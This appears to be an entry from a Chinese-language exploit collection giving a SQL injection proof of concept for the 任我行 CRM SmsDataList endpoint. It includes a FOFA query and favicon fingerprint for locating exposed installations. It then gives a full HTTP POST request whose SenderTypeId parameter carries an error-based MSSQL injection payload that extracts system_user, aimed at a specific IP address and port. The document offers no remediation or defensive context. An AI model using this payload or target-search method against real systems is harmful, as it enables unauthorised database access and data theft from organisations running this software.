# 任我行CRM SmsDataList SQL注入

    ![img](http://112.53.236.114:81/favicon.ico)

特征favicon.ico

## fofa

```
app="任我行-CRM"
```

## poc

```
POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1
Host: 101.200.41.166:8888
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 132

Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000' and 1=convert(int,(system_user)) AND 'CvNI'='CvNI
```
